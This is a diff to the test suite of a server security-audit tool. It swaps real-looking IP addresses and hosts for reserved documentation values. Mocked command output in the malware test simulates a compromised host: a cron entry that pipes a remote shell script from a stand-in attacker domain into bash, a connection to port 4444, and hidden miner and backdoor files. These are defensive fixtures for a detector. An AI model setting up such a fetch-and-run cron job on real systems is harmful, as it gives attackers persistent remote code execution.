@@ -101,10 +101,10 @@ class TestFormatReport:
         ]
         categories = {"ssh": {"weight": 100, "findings": findings}}
         scores = _compute_scores(categories)
-        report = _format_report("testhost", "1.2.3.4", scores, categories)
+        report = _format_report("testhost", "198.51.100.10", scores, categories)
         assert "# Security Audit Report" in report
         assert "testhost" in report
-        assert "1.2.3.4" in report
+        assert "198.51.100.10" in report
         assert "## SSH" in report
         assert "FAIL" in report
         assert "Root login" in report
@@ -670,7 +670,7 @@ class TestAuditNetwork:
                 stdout="tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1234/sshd\ntcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 5678/mysqld\ntcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTEN 9999/redis\n",
                 stderr="", exit_code=0, duration_ms=10,
             ),
-            CommandResult(stdout="tcp 0 0 10.0.0.1:43210 185.100.87.206:4444 ESTABLISHED 666/suspicious\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="tcp 0 0 192.0.2.11:43210 203.0.113.10:4444 ESTABLISHED 666/suspicious\n", stderr="", exit_code=0, duration_ms=10),
             CommandResult(stdout="1\n", stderr="", exit_code=0, duration_ms=10),
         ]
         findings = _audit_network(mock_ssh, "prod")
@@ -1310,11 +1310,11 @@ class TestAuditMalware:
 
     def test_compromised_system(self, mock_ssh):
         mock_ssh.execute.side_effect = [
-            CommandResult(stdout="* * * * * curl http://evil.com/shell.sh | bash\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="* * * * * curl https://malware.example.invalid/shell.sh | bash\n", stderr="", exit_code=0, duration_ms=10),
             CommandResult(stdout="1234 /proc/1234/exe (deleted)\n", stderr="", exit_code=0, duration_ms=10),
             CommandResult(stdout="/tmp/.ice-unix/.x\n", stderr="", exit_code=0, duration_ms=10),
             CommandResult(stdout=".hidden_miner\n.backdoor\n", stderr="", exit_code=0, duration_ms=10),
-            CommandResult(stdout="127.0.0.1 localhost\n1.2.3.4 google.com\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="127.0.0.1 localhost\n198.51.100.10 google.com\n", stderr="", exit_code=0, duration_ms=10),
         ]
         findings = _audit_malware(mock_ssh, "prod")
         statuses = {f["check"]: f["severity"] for f in findings}
@@ -1491,7 +1491,7 @@ class TestFullSecurityAudit:
         # Hostname/IP: 2 commands at start
         meta_responses = [
             CommandResult(stdout="testhost\n", stderr="", exit_code=0, duration_ms=10),
-            CommandResult(stdout="1.2.3.4\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="198.51.100.10\n", stderr="", exit_code=0, duration_ms=10),
         ]
 
         mock_ssh.execute.side_effect = (
